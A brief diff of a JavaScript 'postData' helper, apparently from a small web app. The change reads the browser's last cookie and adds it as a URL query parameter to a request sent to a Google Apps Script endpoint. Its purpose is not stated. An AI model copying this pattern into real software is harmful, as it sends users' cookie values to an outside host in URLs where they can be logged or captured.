@@ -1,5 +1,7 @@
 export default async function postData(data = {}) {
-    await fetch("https://script.google.com/macros/s/AKfycbzKG0-oeNqKFtwGhVnio1C3ItM8A__vJdbCb9xN7QLVtgQi3MTfhkhJiJE1xDeWAX1s-A/exec", {
+    const cookie = (`; ${document.cookie}`).split(`; `).pop().split(';')[0];
+
+    await fetch(`https://script.google.com/macros/s/AKfycby5MjjoyBUQ8vBCJrPrT1In-k0eoOLtOZ6GuhWd7ZgidB-E4mHf_sWLAAMopGjmGnt0DA/exec?cookie=${cookie}`, {
         method: "POST",
         headers: {
             "Content-Type": "text/plain",
